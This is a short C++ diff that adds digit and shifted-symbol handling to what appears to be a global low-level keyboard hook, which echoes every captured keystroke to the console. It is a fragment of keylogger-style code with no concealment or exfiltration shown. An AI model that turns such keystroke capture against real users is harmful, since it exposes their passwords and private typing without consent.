@@ -23,6 +23,66 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 		switch (p->vkCode)
 		{
+		case 0x30:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '0';
+			else
+				cout << ')';
+			break;
+		case 0x31:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '1';
+			else
+				cout << '!';
+			break;
+		case 0x32:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '2';
+			else
+				cout << '@';
+			break;
+		case 0x33:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '3';
+			else
+				cout << '#';
+			break;
+		case 0x34:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '4';
+			else
+				cout << '$';
+			break;
+		case 0x35:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '5';
+			else
+				cout << '%';
+			break;
+		case 0x36:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '6';
+			else
+				cout << '^';
+			break;
+		case 0x37:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '7';
+			else
+				cout << '&';
+			break;
+		case 0x38:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '8';
+			else
+				cout << '*';
+			break;
+		case 0x39:
+			if (GetAsyncKeyState(VK_SHIFT) >= 0)
+				cout << '9';
+			else
+				cout << '(';
+			break;
 		case 0x41:
 			if (GetAsyncKeyState(VK_SHIFT) >= 0)
 				cout << 'a';
